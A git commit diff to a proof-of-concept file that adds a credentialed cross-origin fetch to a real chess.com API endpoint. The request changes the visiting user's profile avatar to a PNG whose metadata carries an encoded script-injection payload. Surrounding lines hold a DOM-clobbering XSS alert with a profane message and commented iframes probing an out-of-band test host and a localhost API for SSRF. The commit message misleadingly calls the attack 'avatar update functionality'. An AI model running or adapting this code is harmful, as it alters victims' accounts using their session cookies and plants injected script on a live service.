5cfe0a0592d73cf9eb4f7362379a0dad5f5d5baa
Hussein Mahmoud <housien.a.khalek19@gmail.com>
2026-05-04 14:02:43 +0300

    Implement user avatar update functionality
    Add fetch request to update user profile avatar

--- POC.js
+++ POC.js
@@ -8,7 +8,22 @@ alert("DOM Clobbering XSS by Hussein on: " + document.domain + "Fuck you Adham")
 // <iframe src="http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest3"></iframe>
 // <iframe src="http://127.0.0.1:8080/api/users" width="800" height="500"></iframe>
 
-
+fetch("https://api.chess.com/rpc/chesscom.user_profile.v1.UserProfileService/UpdateProfileAvatar", {
+  method: "POST",
+  credentials: "include", // مهم عشان ياخد الكوكيز تلقائي
+  headers: {
+    "Content-Type": "application/json",
+    "Accept": "application/json, text/plain, */*",
+    "Connect-Protocol-Version": "1"
+  },
+  body: JSON.stringify({
+    content: "iVBORw0KGgoAAAANSUhEUgAAAJYAAACUCAMAAABGFyDbAAAAIGNIUk0AAHomAACAhAAA+gAAAIDoAAB1MAAA6mAAADqYAAAXcJy6UTwAAACTUExURf////r///H//+Dq6trV1dy8vNuoqNyQkOCLi+R7e/f//+/v7+7Y2OnJydiUlN5oaOAXF+0AAP8AANtfX+Tj49iqquhzc+1TU+0KCvcAAO/p6enOztd+ftrOzuxBQfQAANadnd4uLucyMtl5eebY2N5YWNxMTNzCwvsAAO0vL+0lJdixsfMdHeIkJN5EROO2tu9gYHcVvsQAAAABYktHRACIBR1IAAAAB3RJTUUH6gIJFg0VvBvLygAAADB0RVh0Y29tbWVudAAvPjxzY3JpcHQ+YWxlcnQoIlhTU19TVUNDRVNTIik7PC9zY3JpcHQ+GPVOugAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAyNi0wMi0wOVQyMjoxMjoxNyswMDowMJrmdFYAAAAldEVYdGRhdGU6bW9kaWZ5ADIwMjYtMDItMDlUMjI6MTI6MTErMDA6MDCIa/nQAAAAKHRFWHRkYXRlOnRpbWVzdGFtcAAyMDI2LTAyLTA5VDIyOjEzOjIxKzAwOjAwvjO00gAAA7pJREFUeNrtnItyqjAQhkG8oGjRqIhKvSC1trW17/90h6gMoKBckuw/0/O9AP8ky+4m2V1N+w8Fegi1hgQNo9lqd0yzG2KanXaraTQo9fSs/uDFHo7YHaPhuDPoWz31mvTJ1Jm5c5bL3J057YnKbdUXS2/ICjH0lgs10vRXc7UuJoqzXpmv0oXpi822uKSI7UbukhmeX14Ux98Z0lYqGM+riTr/AuNAyooZjltdFMd1xK+Y5ZUw8zzWniV2/6ar+qI4q6nAnQzexIjivPUFiepNaxpVGncqJChZe5GiOHsBFvbui1YVerH3uhu4ES+Ks6m1kQ37IEfWwa6Rk02Em1XMflJZlS9PVWhgFXUtP2SqYuxjWUVVU6i3ymLUrLBWn7JVMfZZer0m0tfqvF4l7SvwVagK7T4oo6qhSFWoq4T/ssaqVDE2Lh4gd5J8exaHXVFVX+pEcb4KmvtRraxjIbNvfKtVxdh3AbPXTdWqGDOfJ/itGmfBqsxbT7dQiXe/xX2yjRRbyHmyjctR/U9UYfQwaOs/NKoY+3m0XC0qVYw9sHqLbLEYm+XHxo3CWHjLYYPlHCJynUSbUhVj7RzLmtHKyrGuE0HYSTI/Zcoi/A0v/GSpalKrYizj3EgVDZNkRMaFoNvROqwW93GH2OA5GXmXTa2JY995eKKMJs3o1tO/Uyu6cHOpqnvUgi546X+ROvBE3ASgvuIjax7H9BvHiTDTSnJIx0UQ0wqNKyVL+QE/j++U1xLwWCiGddJzAWQPEcksQvGN1iOSt10ASU2EmfDxDrWYGCf2871fajExv/GTHkro4STCz8KnFhPjxxlqX8H7TlE+46hIdauVReKmawnj5EM3Dy9rgCRrEMsCOIxFzPFlYW4iqMmjysJ0p6DBBzRUgyY2oGkgaNIMesRAPZCBHl9BD/tawWYB+aSuRlAvkkCv3UAvKVHCz82VLugFOOhzAerjCuhTFOrDHegzJ+ijMEIWkVl6jVlwgFqeQR2A8kqlMEt/UAulaMvK8hYLtggPtGQRtcATtBwWtXgYtNQatTAdtYwftOkBtUUEtaEGtf0ItVlLa1QY+lCNbanWXMxGQFVtk27ptlzMJlMVLbluhZZc1AZm1HZv1OZ41FECqIMXNNAxFRrqUA/UESia4IExJaPgIzDH62igw4g4hlMzx5cxuonvZGDXGXRlB9JG0Bk7v5ooiWPBzisGOUTtrAxw5Nx1yQAH9F2l4Y0zvPJo+KP9QjP8MSYalbnrdncIozLT6DrYZNE/xD/Km2hTBSqgTgAAAABJRU5ErkJggg==",
+    filename: "user-avatar"
+  })
+})
+.then(res => res.json())
+.then(data => console.log(data))
+.catch(err => console.error(err));
 //(2)
 // function addNewlines(str) 
 // {var result = '';
